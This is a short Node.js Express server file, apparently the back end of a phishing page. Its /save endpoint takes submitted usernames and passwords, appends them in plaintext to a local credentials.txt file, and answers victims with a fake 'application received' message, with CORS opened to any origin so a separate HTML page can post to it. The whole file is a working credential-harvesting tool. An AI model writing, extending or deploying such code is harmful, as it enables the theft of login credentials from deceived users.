const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Allow CORS (so HTML served locally can call API)
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
  next();
});

// Save credentials endpoint
app.post("/save", (req, res) => {
  const { username, password } = req.body;
  const data = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("credentials.txt", data, (err) => {
    if (err) {
      console.error("Error saving credentials:", err);
      return res.status(500).send("Error saving credentials");
    }
    res.send("Successfully Applied! Our team will review your application.");
  });
});

app.listen(3000, () => {
  console.log("✅ Server running at http://localhost:3000");
});
